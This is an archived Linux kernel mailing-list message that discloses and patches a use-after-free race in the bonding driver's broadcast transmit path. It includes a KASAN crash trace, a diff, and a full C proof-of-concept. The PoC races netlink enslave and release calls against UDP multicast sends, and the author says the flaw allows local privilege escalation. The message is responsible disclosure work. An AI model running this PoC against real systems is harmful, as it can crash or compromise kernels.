Return-Path: <netdev+bounces-269215-lists+netdev=lfdr.de@vger.kernel.org>
Delivered-To: lists+netdev@lfdr.de
Received: from mail.lfdr.de
	by lfdr with LMTP
	id x6NDDv80u2mTgwIAu9opvQ
	(envelope-from <netdev+bounces-269215-lists+netdev=lfdr.de@vger.kernel.org>)
	for <lists+netdev@lfdr.de>; Thu, 19 Mar 2026 00:27:59 +0100
X-Original-To: lists+netdev@lfdr.de
Received: from tor.lore.kernel.org (tor.lore.kernel.org [IPv6:2600:3c04:e001:36c::12fc:5321])
	by mail.lfdr.de (Postfix) with ESMTPS id 9B2442C3D3E
	for <lists+netdev@lfdr.de>; Thu, 19 Mar 2026 00:27:58 +0100 (CET)
Received: from smtp.subspace.kernel.org (conduit.subspace.kernel.org [100.90.174.1])
	by tor.lore.kernel.org (Postfix) with ESMTP id 416F83018C28
	for <lists+netdev@lfdr.de>; Wed, 18 Mar 2026 23:27:57 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id 9BFAA378D9E;
	Wed, 18 Mar 2026 23:27:54 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.b="fpxd2Ixh"
X-Original-To: netdev@vger.kernel.org
Received: from mail-dy1-f171.google.com (mail-dy1-f171.google.com [74.125.82.171])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id DAD8A2459DC
	for <netdev@vger.kernel.org>; Wed, 18 Mar 2026 23:27:52 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.82.171
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1773876474; cv=none; b=GRXMyhyEEpPNKLjJY1GpGfHVNRePAjfIVnjbdbNjoRdm735kfiojGSeQULfHvU5U/vkMrO93kXwRbkIo9QaK5XCfWzHEH39RruCV1q2EuK433l2vQRoPKSM6EJHN2cbgVvXYlVdvhLzxj60lbA1fCeqYlJxG4MS+Hp4PSxT3hdw=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1773876474; c=relaxed/simple;
	bh=gLvHC1vjjvEHtlPM8c+qe8XWJ8MyBY7lWVF64yeTF6o=;
	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
	 Content-Type:Content-Disposition:In-Reply-To; b=kEvt6zd5/nJ+JdAUenEUyHq1ORTULFyIPaMv3PZZL1qH6LrIyhfv0DmcfG7/rNQJ2wzvb1AZc12qpgojeb3sKA3vsJwL6dGULF5tZVHKTaGV22jSmx1cvIie6r+7EOTpgTLEqZkOsgXMIhi85JXlvQcFqTJPr45wippxhAmbnMw=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu; spf=pass smtp.mailfrom=asu.edu; dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.b=fpxd2Ixh; arc=none smtp.client-ip=74.125.82.171
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=asu.edu
Received: by mail-dy1-f171.google.com with SMTP id 5a478bee46e88-2ba895adfeaso504900eec.0
        for <netdev@vger.kernel.org>; Wed, 18 Mar 2026 16:27:52 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=asu.edu; s=google; t=1773876472; x=1774481272; darn=vger.kernel.org;
        h=in-reply-to:content-disposition:mime-version:references:message-id
         :subject:cc:to:from:date:from:to:cc:subject:date:message-id:reply-to;
        bh=ZfdO4bYFEZOXskJZywF4MvAOwKEg5P6tdqrHbfESyAQ=;
        b=fpxd2Ixh/2ipUe9SjVEqegBRVzuVJF8CkRKJuy0sOuVnHKdQeqF5vvRtjhmEDjRBQF
         VC1dLaKqrMF9fIfNpDQZttiTWRhkstDfSPlw5nvoGbmMVR9oWqEJDi+saCpqqPBWMW1f
         voOWiZju106a6Q/ydzZgUVyQO7QrHLRbqzAZ02HoILi1JCZAlqG5Yebq2GXLTLwbJ6ta
         T/IZYzv4CWd+4GAPglG27IigRl1c9zEQdDdytxXB+p2NSYc3/LHqpsmc45lpvQxD3sAL
         28/I4ojbK8u+Gj4BTM97f5zeDGnTa2B0GNpLltCyhnEE78ckaigARucX5k3T4pjn7PK7
         dRVA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1773876472; x=1774481272;
        h=in-reply-to:content-disposition:mime-version:references:message-id
         :subject:cc:to:from:date:x-gm-gg:x-gm-message-state:from:to:cc
         :subject:date:message-id:reply-to;
        bh=ZfdO4bYFEZOXskJZywF4MvAOwKEg5P6tdqrHbfESyAQ=;
        b=nvSi/FepIuA5U3MtRi53CseYCXPZqH/XMmFEx1rufS4xfdD9vIvaDrXdykFvFAaHgd
         y9z42slKbXf9+QKOD17FheXCP0ijvLqRKKgp3/REs9ZCOvCzIEDkJXjzS1dDiqbCDe/l
         ePhUZMIKqpQ0q2AlUbl9raGRCByCMTk8HZrdfBfffKvk3nf1E5m68tsGGTcGzB6nmxSX
         +pBx1ghGsUZnkJHwBqHIxKwzg9vdSrb3bL9LWuF84VaPz2gzIh3Ma+EtOL3NtM4qo86e
         gbS0xkskUi12hyU3SLCQsy7Vw0pKrBwevK4R36STTKsgc9gp2k47TtmXqlT5Ia0H256e
         9phA==
X-Gm-Message-State: AOJu0YxrWT2SznRv09iYK7NeNSifduMT1Xlw/08/fIsC18rwPUApkwT0
	pylMdNw2aIFMtf9ctJC+vG7j6Z5XDOA5yrSfnwvGVPWqeEDf7/yQuvdFbJQCpCmyEw==
X-Gm-Gg: ATEYQzxlJkcITAgFJ7YxqqgTBGQ6KmiG/0NsfJjayL72r9+90FJMyKOd1HOynf5s4Lb
	3xS34pNysvN9RUv0PdYOkiMAMXnwW7uzIPbc4Mk/MAZY/tIusHgQXTWrYvyYFLjzXErt+5kx9C7
	SeoVrBzPZMH5HXr85gdNHt64aH//GPhUpdR0aGLML8vxXDyp9dpykNqQTBiI6XHSeMz1RT5vcsP
	XKvJhWOHZ/PPfmkWH+YBKIMNog4zXoh+oI0L6qPHbkbXHWMCHgLoUR3Hq3wqhj1KQ301oOSlL+X
	YVdM7inEQg1RBvKj6Dn8sHX4PhhRqJIYPOPp43C35/N3sif27XLg2iQamB3cvwze+BAM0osNp0X
	T8bnWKyg1viAxkEhP1oOhgpUiaAWPJq6+tSUVcfjABhM8Eirezx2iN+c9vvO2R+OW+pmaa2ZZfv
	jnVmKBNvWWqZwzKxnnpdt5wGOpysRJ0g==
X-Received: by 2002:a05:7301:1285:b0:2c0:ced1:5851 with SMTP id 5a478bee46e88-2c0e5016473mr2214458eec.11.1773876471807;
        Wed, 18 Mar 2026 16:27:51 -0700 (PDT)
Received: from p1 (209-147-138-15.nat.asu.edu. [209.147.138.15])
        by smtp.gmail.com with ESMTPSA id 5a478bee46e88-2c0e55ee672sm7270050eec.28.2026.03.18.16.27.51
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Wed, 18 Mar 2026 16:27:51 -0700 (PDT)
Date: Wed, 18 Mar 2026 16:27:49 -0700
From: Xiang Mei <xmei5@asu.edu>
To: security@kernel.org
Cc: netdev@vger.kernel.org, jv@jvosburgh.net, andrew+netdev@lunn.ch, 
	davem@davemloft.net, edumazet@google.com, kuba@kernel.org, pabeni@redhat.com, 
	bestswngs@gmail.com
Subject: Re: [PATCH net] net: bonding: fix use-after-free in
 bond_xmit_broadcast()
Message-ID: <rqfnk6t63iu3dfucy7wkrgcpswr2man7fbdmx6uebjypjwfjlx@jbg7yeifi6i5>
References: <20260318232332.3528647-1-xmei5@asu.edu>
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
In-Reply-To: <20260318232332.3528647-1-xmei5@asu.edu>
X-Spamd-Result: default: False [-0.16 / 15.00];
	SUSPICIOUS_RECIPS(1.50)[];
	ARC_ALLOW(-1.00)[subspace.kernel.org:s=arc-20240116:i=1];
	MID_RHS_NOT_FQDN(0.50)[];
	DMARC_POLICY_ALLOW(-0.50)[asu.edu,none];
	R_SPF_ALLOW(-0.20)[+ip6:2600:3c04:e001:36c::/64:c];
	R_DKIM_ALLOW(-0.20)[asu.edu:s=google];
	MAILLIST(-0.15)[generic];
	MIME_GOOD(-0.10)[text/plain];
	HAS_LIST_UNSUB(-0.01)[];
	FORGED_SENDER_MAILLIST(0.00)[];
	DKIM_TRACE(0.00)[asu.edu:+];
	FORGED_RECIPIENTS_MAILLIST(0.00)[];
	RCVD_TLS_LAST(0.00)[];
	TAGGED_FROM(0.00)[bounces-269215-lists,netdev=lfdr.de];
	FREEMAIL_CC(0.00)[vger.kernel.org,jvosburgh.net,lunn.ch,davemloft.net,google.com,kernel.org,redhat.com,gmail.com];
	MISSING_XM_UA(0.00)[];
	FROM_HAS_DN(0.00)[];
	MIME_TRACE(0.00)[0:+];
	RCVD_COUNT_FIVE(0.00)[5];
	PRECEDENCE_BULK(0.00)[];
	FROM_NEQ_ENVFROM(0.00)[xmei5@asu.edu,netdev@vger.kernel.org];
	ASN(0.00)[asn:63949, ipnet:2600:3c04::/32, country:SG];
	TO_DN_NONE(0.00)[];
	RCPT_COUNT_SEVEN(0.00)[9];
	NEURAL_HAM(-0.00)[-0.956];
	RCVD_VIA_SMTP_AUTH(0.00)[];
	TAGGED_RCPT(0.00)[netdev];
	DBL_BLOCKED_OPENRESOLVER(0.00)[tor.lore.kernel.org:helo,tor.lore.kernel.org:rdns,asu.edu:dkim,asu.edu:email]
X-Rspamd-Queue-Id: 9B2442C3D3E
X-Rspamd-Action: no action
X-Rspamd-Server: lfdr

On Wed, Mar 18, 2026 at 04:23:32PM -0700, Xiang Mei wrote:
> bond_xmit_broadcast() reuses the original skb for the last slave
> (determined by bond_is_last_slave()) and clones it for others.
> Concurrent slave enslave/release can mutate the slave list during
> RCU-protected iteration, changing which slave is "last" mid-loop.
> This causes the original skb to be either double-consumed or freed.
> 
> Always clone the skb for every slave and unconditionally free the
> original after the loop, removing the racy bond_is_last_slave()
> optimization.
> 
> The UAF can trigger the following crash:
> 
> ==================================================================
> BUG: KASAN: slab-use-after-free in skb_clone
> Read of size 8 at addr ffff888100ef8d40 by task exploit/147
> 
> CPU: 1 UID: 0 PID: 147 Comm: exploit Not tainted 7.0.0-rc3+ #4 PREEMPTLAZY
> Call Trace:
>  <TASK>
>  dump_stack_lvl (lib/dump_stack.c:123)
>  print_report (mm/kasan/report.c:379 mm/kasan/report.c:482)
>  kasan_report (mm/kasan/report.c:597)
>  skb_clone (include/linux/skbuff.h:1724 include/linux/skbuff.h:1792 include/linux/skbuff.h:3396 net/core/skbuff.c:2108)
>  bond_xmit_broadcast (drivers/net/bonding/bond_main.c:5334)
>  bond_start_xmit (drivers/net/bonding/bond_main.c:5567 drivers/net/bonding/bond_main.c:5593)
>  dev_hard_start_xmit (include/linux/netdevice.h:5325 include/linux/netdevice.h:5334 net/core/dev.c:3871 net/core/dev.c:3887)
>  __dev_queue_xmit (include/linux/netdevice.h:3601 net/core/dev.c:4838)
>  ip6_finish_output2 (include/net/neighbour.h:540 include/net/neighbour.h:554 net/ipv6/ip6_output.c:136)
>  ip6_finish_output (net/ipv6/ip6_output.c:208 net/ipv6/ip6_output.c:219)
>  ip6_output (net/ipv6/ip6_output.c:250)
>  ip6_send_skb (net/ipv6/ip6_output.c:1985)
>  udp_v6_send_skb (net/ipv6/udp.c:1442)
>  udpv6_sendmsg (net/ipv6/udp.c:1733)
>  __sys_sendto (net/socket.c:730 net/socket.c:742 net/socket.c:2206)
>  __x64_sys_sendto (net/socket.c:2209)
>  do_syscall_64 (arch/x86/entry/syscall_64.c:63 arch/x86/entry/syscall_64.c:94)
>  entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:130)
>  </TASK>
> 
> Allocated by task 147:
> 
> Freed by task 147:
> 
> The buggy address belongs to the object at ffff888100ef8c80
>  which belongs to the cache skbuff_head_cache of size 224
> The buggy address is located 192 bytes inside of
>  freed 224-byte region [ffff888100ef8c80, ffff888100ef8d60)
> 
> Memory state around the buggy address:
>  ffff888100ef8c00: fb fb fb fb fc fc fc fc fc fc fc fc fc fc fc fc
>  ffff888100ef8c80: fa fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
> >ffff888100ef8d00: fb fb fb fb fb fb fb fb fb fb fb fb fc fc fc fc
>                                                     ^
>  ffff888100ef8d80: fc fc fc fc fc fc fc fc fa fb fb fb fb fb fb fb
>  ffff888100ef8e00: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
> ==================================================================
> 
> Fixes: 4e5bd03ae346 ("net: bonding: fix bond_xmit_broadcast return value error bug")
> Reported-by: Weiming Shi <bestswngs@gmail.com>
> Signed-off-by: Xiang Mei <xmei5@asu.edu>
> ---
>  drivers/net/bonding/bond_main.c | 19 ++++++-------------
>  1 file changed, 6 insertions(+), 13 deletions(-)
> 
> diff --git a/drivers/net/bonding/bond_main.c b/drivers/net/bonding/bond_main.c
> index 33f414d03ab91..8e57bee13e4ad 100644
> --- a/drivers/net/bonding/bond_main.c
> +++ b/drivers/net/bonding/bond_main.c
> @@ -5310,7 +5310,6 @@ static netdev_tx_t bond_xmit_broadcast(struct sk_buff *skb,
>  	struct bonding *bond = netdev_priv(bond_dev);
>  	struct bond_up_slave *slaves;
>  	bool xmit_suc = false;
> -	bool skb_used = false;
>  	int slaves_count, i;
>  
>  	if (all_slaves)
> @@ -5326,24 +5325,18 @@ static netdev_tx_t bond_xmit_broadcast(struct sk_buff *skb,
>  		if (!(bond_slave_is_up(slave) && slave->link == BOND_LINK_UP))
>  			continue;
>  
> -		if (bond_is_last_slave(bond, slave)) {
> -			skb2 = skb;
> -			skb_used = true;
> -		} else {
> -			skb2 = skb_clone(skb, GFP_ATOMIC);
> -			if (!skb2) {
> -				net_err_ratelimited("%s: Error: %s: skb_clone() failed\n",
> -						    bond_dev->name, __func__);
> -				continue;
> -			}
> +		skb2 = skb_clone(skb, GFP_ATOMIC);
> +		if (!skb2) {
> +			net_err_ratelimited("%s: Error: %s: skb_clone() failed\n",
> +					    bond_dev->name, __func__);
> +			continue;
>  		}
>  
>  		if (bond_dev_queue_xmit(bond, skb2, slave->dev) == NETDEV_TX_OK)
>  			xmit_suc = true;
>  	}
>  
> -	if (!skb_used)
> -		dev_kfree_skb_any(skb);
> +	dev_kfree_skb_any(skb);
>  
>  	if (xmit_suc)
>  		return NETDEV_TX_OK;
> -- 
> 2.43.0
>

Thanks for your attention for this bug. It's a UAF enabling local
privilege escapeing.

The following information could help you to reproduce the bug:

Required Kernel Configs for reproducing:
```
CONFIG_BONDING=y
CONFIG_NET_NS=y
CONFIG_NETDEVICES=y
CONFIG_IPV6=y
CONFIG_KASAN=y
CONFIG_KASAN_INLINE=y
CONFIG_KASAN_GENERIC=y
```

The source code of the PoC
```c
#define _GNU_SOURCE
#include <sched.h>
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <linux/rtnetlink.h>
#include <linux/if_link.h>
#include <sys/socket.h>
#include <netinet/in.h>

struct nlreq { struct nlmsghdr n; struct ifinfomsg i; char buf[512]; };

static void nlsend(int fd, struct nlreq *r)
{
    char ack[512];
    write(fd, r, r->n.nlmsg_len);
    read(fd, ack, sizeof(ack));
}

static int addattr(void *b, int type, const void *d, int len)
{
    struct rtattr *a = b;
    a->rta_type = type; a->rta_len = RTA_LENGTH(len);
    memcpy(RTA_DATA(a), d, len);
    return RTA_ALIGN(a->rta_len);
}

#define INIT_REQ(r, t, f) do { \
    memset(&r, 0, sizeof(r)); \
    r.n.nlmsg_type = t; r.n.nlmsg_flags = (f)|NLM_F_REQUEST|NLM_F_ACK; \
    r.n.nlmsg_len = NLMSG_LENGTH(sizeof(struct ifinfomsg)); } while(0)

static void nl_add(int fd, const char *name, const char *kind)
{
    struct nlreq r;
    INIT_REQ(r, RTM_NEWLINK, NLM_F_CREATE|NLM_F_EXCL);
    r.n.nlmsg_len += addattr((char*)&r+r.n.nlmsg_len, IFLA_IFNAME, name, strlen(name)+1);
    struct rtattr *li = (void*)((char*)&r+r.n.nlmsg_len);
    li->rta_type = IFLA_LINKINFO; li->rta_len = RTA_LENGTH(0);
    li->rta_len += addattr((char*)li+li->rta_len, IFLA_INFO_KIND, kind, strlen(kind)+1);
    r.n.nlmsg_len += RTA_ALIGN(li->rta_len);
    nlsend(fd, &r);
}

static void nl_up(int fd, const char *name)
{
    struct nlreq r;
    INIT_REQ(r, RTM_NEWLINK, 0);
    r.i.ifi_index = if_nametoindex(name);
    r.i.ifi_change = IFF_UP; r.i.ifi_flags = IFF_UP;
    nlsend(fd, &r);
}

static void nl_master(int fd, const char *dev, const char *master)
{
    struct nlreq r;
    INIT_REQ(r, RTM_NEWLINK, 0);
    r.i.ifi_index = if_nametoindex(dev);
    __u32 idx = master ? if_nametoindex(master) : 0;
    r.n.nlmsg_len += addattr((char*)&r+r.n.nlmsg_len, IFLA_MASTER, &idx, sizeof(idx));
    nlsend(fd, &r);
}

static void nl_bond_mode(int fd, const char *name, __u8 mode)
{
    struct nlreq r;
    INIT_REQ(r, RTM_NEWLINK, 0);
    r.i.ifi_index = if_nametoindex(name);
    struct rtattr *li = (void*)((char*)&r+r.n.nlmsg_len);
    li->rta_type = IFLA_LINKINFO; li->rta_len = RTA_LENGTH(0);
    li->rta_len += addattr((char*)li+li->rta_len, IFLA_INFO_KIND, "bond", 5);
    struct rtattr *d = (void*)((char*)li+li->rta_len);
    d->rta_type = IFLA_INFO_DATA; d->rta_len = RTA_LENGTH(0);
    d->rta_len += addattr((char*)d+d->rta_len, IFLA_BOND_MODE, &mode, 1);
    li->rta_len += RTA_ALIGN(d->rta_len);
    r.n.nlmsg_len += RTA_ALIGN(li->rta_len);
    nlsend(fd, &r);
}

static void pin(int id)
{
    cpu_set_t s; CPU_ZERO(&s); CPU_SET(id, &s);
    sched_setaffinity(0, sizeof(s), &s);
}

int main(void)
{
    int fd = socket(PF_NETLINK, SOCK_RAW, NETLINK_ROUTE);

    nl_up(fd, "lo");
    nl_add(fd, "bond0", "bond");
    nl_bond_mode(fd, "bond0", 3); // Braodcase
    nl_up(fd, "bond0");
    nl_add(fd, "dummy0", "dummy");
    nl_add(fd, "dummy1", "dummy");
    nl_master(fd, "dummy0", "bond0");
    nl_master(fd, "dummy1", "bond0");
    nl_up(fd, "dummy0");
    nl_up(fd, "dummy1");

    if (fork()) {
        pin(0);
        while (1) {
            nl_master(fd, "dummy0", "bond0");
            nl_master(fd, "dummy0", NULL);
        }
    } else {
        pin(1);
        int s = socket(AF_INET6, SOCK_DGRAM, 0);
        struct sockaddr_in6 dst = {
            .sin6_family = AF_INET6, .sin6_port = htons(12345),
            .sin6_scope_id = if_nametoindex("bond0"),
        };
        inet_pton(AF_INET6, "ff02::1", &dst.sin6_addr);
        while (1)
            sendto(s, "x", 1, 0, (struct sockaddr*)&dst, sizeof(dst));
    }
}
```

The intended crash was attached in the commit message. Please let me know
if you have any questions for the patch and poc.

Thanks,
Xiang



